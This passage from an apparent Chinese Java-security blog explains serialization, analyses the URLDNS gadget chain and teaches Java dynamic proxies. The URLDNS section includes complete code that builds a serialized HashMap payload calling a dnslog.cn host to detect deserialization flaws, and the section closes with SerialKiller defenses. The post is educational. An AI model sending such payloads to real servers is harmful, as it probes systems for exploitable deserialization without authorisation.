class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream input=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d:/1.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">NEW</span> <span class="operator">=</span>input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(NEW);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Employee test=<span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        Serial(test);</span><br><span class="line">        Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>● 入口类 source （即找到重写 readObject方法，调用常见的函数，参数类型宽泛 最好 jdk 自带）<br>●  调用链 gadget chain （基于类的默认方式调用）<br>●  执行类 sink （RCE、SSRF、写文件等操作）</p><h4 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h4><ul><li>在序列化和反序列化过程中，确保对象的兼容性。当对象被序列化后，如果该类的结构发生了变化，比如添加、删除或修改了成员变量、方法等，反序列化时可能会出现问题。</li><li>通过显式地指定<code>serialVersionUID</code>，可以在一定程度上控制不同版本的类之间的兼容性。如果序列化和反序列化时的<code>serialVersionUID</code>一致，那么 Java 虚拟机认为这两个版本是兼容的，可以进行反序列化操作</li></ul><h5 id="显示id"><a href="#显示id" class="headerlink" title="显示id"></a>显示id</h5><p>   静态变量和被设置的属性不会被序列化，因此我们一般都是设置一个静态变量.作为显示id</p><p>显式地定义了一个<code>serialVersionUID</code>，在类的结构发生变化时，反序列化不一定没有影响。<br>如果类的结构变化是向后兼容的，比如添加了新的不参与序列化的方法、添加了新的具有默认值的成员变量等，那么在反序列化时通常不会有问题。<br>但是，如果类的结构变化影响到了已序列化对象的数据，比如删除了成员变量、修改了成员变量的类型等，那么在反序列化时仍然可能会出现问题。<br>例如，假设一个类原本有一个名为<code>name</code>的字符串成员变量，序列化了一个对象后，将这个类中的<code>name</code>成员变量删除了，再进行反序列化时就会抛出异常。<br>所以，虽然定义了<code>serialVersionUID</code>可以在一定程度上提高兼容性，但也不能保证在任意的类结构变化下反序列化都能成功。</p><h5 id="隐式id"><a href="#隐式id" class="headerlink" title="隐式id"></a>隐式id</h5><p>   根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。但是一旦类的结构发生变化,我们将会面临很多问题.</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链</title>
      <link href="/2025/02/05/URLDNS%E9%93%BE/"/>
      <url>/2025/02/05/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h4 id="1-hashmap"><a href="#1-hashmap" class="headerlink" title="1. hashmap"></a>1. hashmap</h4><p>Map是一个集合，本质上还是数组，HashMap是Map的子接口。该集合的结构为key–&gt;value，两个一起称为一个Entry(jdk7)，在jdk8中底层的数组为Node[]。当new HashMap()时，在jdk7中会直接创建一个长度为16的数组；jdk8中并不直接创建，而是在调用put方法时才去创建一个长度为16的数组。<br>hashmap作为入口类。反序列化的入口类就是jdk中经常被使用的类，继承了Serialize接口，具备readObject方法，调用一些类和该类中的某种方法（方法中可以直接或者间接调用危险函数）</p><h4 id="2-首先看看urldns链子的作用"><a href="#2-首先看看urldns链子的作用" class="headerlink" title="2. 首先看看urldns链子的作用"></a>2. 首先看看urldns链子的作用</h4><p><strong>服务器是否存在反序列化漏洞</strong></p><ol><li>触发反序列化操作：通过构造包含 URL 的 HashMap 并进行序列化和反序列化操作，如果服务器成功执行了反序列化，并且触发了对 URL 的访问产生 DNS 请求，那么可以初步判断服务器存在反序列化漏洞的可能性。</li><li>检测漏洞利用条件：验证服务器是否在不恰当的场景下执行了反序列化，例如从不可信的数据源接收序列化数据并进行反序列化操作。<br><strong>二、服务器对外部资源访问的控制情况</strong></li><li>网络访问限制：观察服务器在处理包含 URL 的 HashMap 反序列化时，是否能够成功访问外部 URL 产生 DNS 请求。如果服务器对外部网络访问有严格的控制，可能无法触发 DNS 请求，这也反映了服务器的安全策略对反序列化漏洞利用的限制程度。</li><li>安全防护机制：了解服务器是否有针对反序列化过程中外部资源访问的监测和防护机制，例如防火墙规则、入侵检测系统等。<br><strong>三、确定潜在的攻击面</strong></li><li>漏洞影响范围：如果验证成功，说明服务器可能容易受到基于反序列化漏洞的攻击。可以进一步分析可能受到影响的业务模块和系统组件，确定潜在的攻击面。</li><li>攻击路径探索：根据验证结果，探索可能的攻击路径，例如通过构造更复杂的利用链，结合其他漏洞或弱点，尝试实现更严重的攻击效果，如远程代码执行。</li></ol><p>可以看到,我们了解到urldns链子,我突然有些想法,首先我们可以利用一些原生类,因为这些类是一直存在的,我们可以直接利用就像是urldns链子一样.php也有原生的类.同时php一般都利用魔术方法进行利用,java也有这些方法比如 tostring 方法. 但是java又不一样,因为java更多的是利用重写readobject方法.我们除了盯着原生类去看是否又反序列化漏洞之外,我们还可以看到很多代码审计重写的类去挖掘.不断尝试不同链子.</p><h4 id="3-urldns链子为什么能够验证shiro等反序列化漏洞"><a href="#3-urldns链子为什么能够验证shiro等反序列化漏洞" class="headerlink" title="3. urldns链子为什么能够验证shiro等反序列化漏洞?"></a>3. urldns链子为什么能够验证shiro等反序列化漏洞?</h4><p>这一点，我也是刚刚搞懂，首先我们知道urldns是以hashmap为起点作为一个链子入口，我们可以构造链子去打hashmap的反序列化。但是如果说我们验证比如说其他的反序列化漏洞，如果有序列化hashmap这个类的对象，我们可以以这个类为起点，去构造新的链子触发新的类的操作。所以urldns链子的路径不是一成不变的，只有入口是确定的。</p><h4 id="4-分析"><a href="#4-分析" class="headerlink" title="4. 分析"></a>4. 分析</h4><p>跟着大佬的步骤一步一步进行分析.</p><p>首先拿到hashmap类的源码<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241022213631.png" alt="image.png"></p><p>找到readobject方法，查看重写方法的实现。跟踪hash方法<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023201431.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法很短啊，看到就是传进来一个object对象然后一个判断key对象是否存在，不存在则返回0.存在则返回hashcode的值。这个其实很奇妙，因为我们要看传入进来的这个k到底是什么对象，因为不同的对象对应的hashcode可能被重写了(这里可以提一点，object类已经定义了hashcode这个方法，因此无论是什么对象，都会执行他自己的hashcode)。因此执行的不一定是object这个类的对象，因此可以看到我们的urldns这条链子打的是URL类的一个对象。进入这URL类对象的hashcode<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023214235.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023214251.png" alt="image.png"></p><p>首先看到这个类定义了一个私有属性为-1 ，同时还有个hashcode方法，这个hashcode方法基本就是<br>判断是否是-1 不是-1说明已经计算了hash值，不是则继续计算，继续执行。又是一个hashcode方法 但是此时我们的对象换成了handler 对象，我们跟进handler 查看这个对象的hashcode方法。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241107202557.png" alt="image.png"><br>这是个无法被序列化的属性，其实之前我们就应该知道必须是hashcode 值必须是-1才会执行这个handler对象的hashcode<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023214603.png" alt="image.png"><br>发现这个方法接收一个URL 对象参数 进入gethostaddress<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023215748.png" alt="image.png"></p><p>继续进入 gethostaddress</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个才是主角，查看文档<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241023220022.png" alt="image.png"></p><p>方法首先判断host 和hostaddress都不为空之后，就会执行这个方法，解析这个域名的ip<br>这正是我们想要达到的目的所在。可以看到这些都是一环套一环的，就是有些方法之间互相调用，然后找到一些危险方法。可以执行一些功能操作。</p><h4 id="5-urldns链"><a href="#5-urldns链" class="headerlink" title="5.  urldns链"></a>5.  urldns链</h4><h5 id="5-1-序列化"><a href="#5-1-序列化" class="headerlink" title="5.1 序列化"></a>5.1 序列化</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mytest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DnsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// hashmap类必不可少</span></span><br><span class="line">        URL  url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c40tqs.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">// url 对象必不可少,传入我们需要的 url链子</span></span><br><span class="line">        Class c=URL.class;</span><br><span class="line">        Field fieldHascode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        fieldHascode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 先将hashcode 设置为非-1 主要是因为 put方法将URL对象加进去时候会触发一个putval  </span></span><br><span class="line">        fieldHascode.set(url,<span class="number">233</span>);</span><br><span class="line">        <span class="comment">// 这里是反射机制，反射机制可以修改类的对象的属性等，但是针对private中还是要判定成可以true才可以。 </span></span><br><span class="line">        hashMap.put(url,<span class="number">22</span>);</span><br><span class="line">        fieldHascode.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 触发就很简单了 直接 利用ser.txt 就行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-防护"><a href="#6-防护" class="headerlink" title="6. 防护"></a>6. 防护</h4><p>放在classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</p><p><strong>一、Hot-Reload 特性</strong></p><p>Hot-Reload（热加载）特性允许在应用运行时动态更新配置，无需重启应用即可使新的配置生效。这对于需要频繁调整可信类型列表的场景非常有用，可以快速响应安全需求的变化，提高系统的灵活性和可维护性。</p><p><strong>二、Whitelisting（白名单）特性</strong></p><p>白名单特性允许明确指定哪些类是被允许进行反序列化的。只有在白名单中的类才能够成功反序列化，其他类将被拒绝。这样可以确保只有经过授权的类能够被反序列化，防止恶意类被加载和执行，从而增强系统的安全性。</p><p><strong>三、Blacklisting（黑名单）特性</strong></p><p>黑名单特性与白名单相反，它用于明确指定哪些类是不被允许进行反序列化的。任何在黑名单中的类在反序列化过程中都会被阻止，从而避免潜在的安全风险。这种特性可以针对已知的存在安全问题的类进行快速排除，降低被攻击的可能性。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java动态代理</title>
      <link href="/2025/02/05/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2025/02/05/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="1-静态代理"><a href="#1-静态代理" class="headerlink" title="1. 静态代理"></a>1. 静态代理</h4><p>有一个师傅的文章讲的很好，我们经常说代理。我们可以把我们比作一个租房的人，我们找代理中介去找拥有房源的房东租房子。这个中介就可以作为一个代理。</p><h5 id="1-房源"><a href="#1-房源" class="headerlink" title="1. 房源"></a>1. 房源</h5><p>房源不会做任何操作，它是被别人拿到的，我们可以用java中的接口来表示，这个类没有别的操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.StaticProxy;    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 租房的接口    </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> &#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-房东"><a href="#2-房东" class="headerlink" title="2. 房东"></a>2. 房东</h5><p>房东有租出房的操作，所以作为一类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.StaticProxy;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> &#123;    </span><br><span class="line">    <span class="comment">// 将房子出租</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>&#123;    </span><br><span class="line">        System.out.println(<span class="string">&quot;房东要出租房子&quot;</span>);    </span><br><span class="line">        </span><br><span class="line"> &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-中介类"><a href="#3-中介类" class="headerlink" title="3. 中介类"></a>3. 中介类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.StaticProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 中介  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Host host;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">()</span>&#123;&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">(Host host)</span>&#123;  </span><br><span class="line">    <span class="comment">// 中介要代理一个房东 </span></span><br><span class="line">    <span class="built_in">this</span>.host = host;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>&#123;  </span><br><span class="line">        host.rent();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-客户"><a href="#4-客户" class="headerlink" title="4. 客户"></a>4. 客户</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.StaticProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 启动器  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// 一个房东</span></span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();  </span><br><span class="line"><span class="comment">// 一个中介 </span></span><br><span class="line"><span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(host);  </span><br><span class="line"><span class="comment">// 中介代理房东的房子出租</span></span><br><span class="line">proxy.rent();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然中介代理是一类人，他自然有和房东不同的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.StaticProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 中介  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Host host;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">()</span>&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">(Host host)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.host = host;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>&#123;  </span><br><span class="line">        host.rent();  </span><br><span class="line">contract();  </span><br><span class="line">fare();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 看房  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;中介带你看房&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 收中介费  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fare</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 签租赁合同  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contract</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;签租赁合同&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体静态代理比较简单，简单易懂，但是就是如果说房东很多时候，代码就要很繁琐。</p><h4 id="2-动态代理"><a href="#2-动态代理" class="headerlink" title="2. 动态代理"></a>2. 动态代理</h4><h5 id="2-1-源码"><a href="#2-1-源码" class="headerlink" title="2.1 源码"></a>2.1 源码</h5><ul><li>动态代理的角色和静态代理的一样。需要一个实体类，一个代理类，一个启动器。</li><li>动态代理的代理类是动态生成的，静态代理的代理类是我们提前写好的。</li></ul><ul><li>①：我们代理的是接口，而不是单个用户。  </li><li>②：代理类是动态生成的，而非静态定死。</li></ul><p>两个重要的类</p><h5 id="2-2-InvocationHandler"><a href="#2-2-InvocationHandler" class="headerlink" title="2.2 InvocationHandler"></a>2.2 InvocationHandler</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span></span><br><span class="line"><span class="comment">// InvocationHandler是由代理实例的调用处理程序实现的接口</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这个接口，我们可以在代理时候做一些我们被代理的实体没有实现的方法和操作。也就是说他是个处理程序模块，我们的InvocationHandler 接口就是自动执行这个方法，因此这也是java反序列中一个很好的利用点，他跟readobject一样，都是在proxy对象建立之后代理对象执行方法时候，他会自动触发。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">invoke</span><span class="params">(Object proxy, 方法 method, Object[] args)</span>；</span><br><span class="line"></span><br><span class="line">proxy   代理  </span><br><span class="line">method  proxy执行的被代理对象的方法</span><br><span class="line">args    执行方法的参数</span><br></pre></td></tr></table></figure><h5 id="2-3-Proxy"><a href="#2-3-Proxy" class="headerlink" title="2.3 Proxy"></a>2.3 Proxy</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br></pre></td></tr></table></figure><p>动态代理类 （以下简称为代理类 ）是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 建立动态的一个动态代理类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, 类&lt;?&gt;[] interfaces, InvocationHandler h)</span> <span class="keyword">throws</span> IllegalArgumentException</span><br></pre></td></tr></table></figure><p><strong><code>this.getClass().getClassLoader()</code></strong></p><ul><li>这里的 <code>this</code> 是指 <code>InvocationHandler</code> 的实例（也就是你实现了 <code>invoke()</code> 方法的对象）。调用 <code>getClass()</code> 方法会返回当前对象的 <code>Class</code> 对象，然后通过 <code>getClassLoader()</code> 获取该类的类加载器。</li><li><strong>作用</strong>：<code>getClass().getClassLoader()</code> 返回的是加载 <code>InvocationHandler</code> 实现类的类加载器。这个类加载器会用来加载动态代理类。</li><li>这个类加载器是动态代理类的载体，负责加载代理对象的字节码。</li></ul><p>. <strong><code>userService.getClass().getInterfaces()</code></strong></p><ul><li><code>userService</code> 是你想要代理的实际对象。通过 <code>getClass()</code> 可以获取该对象的 <code>Class</code> 对象，然后通过 <code>getInterfaces()</code> 获取这个类所实现的所有接口。</li><li><strong>作用</strong>：<code>getInterfaces()</code> 返回的是目标对象 <code>userService</code> 实现的所有接口，代理对象需要实现这些接口。动态代理对象会实现目标类所实现的所有接口，从而可以通过代理对象调用这些接口的方法。</li></ul><p> <strong><code>this</code>（即 <code>InvocationHandler</code> 实现类的实例）</strong></p><ul><li><code>this</code> 是指当前的 <code>InvocationHandler</code> 实现对象，它实现了 <code>invoke()</code> 方法，负责拦截代理对象的方法调用并提供自己的处理逻辑。</li></ul><p>因此当动态代理创建好之后，我们的所有操作都是在刚才的程序处理接口中进行的，invoke 就是程序处理程序</p><h5 id="2-4-实例"><a href="#2-4-实例" class="headerlink" title="2.4  实例"></a>2.4  实例</h5><p>此时有一个接口，同时开始实现这个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> src.JdkProxy.DynamicProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span 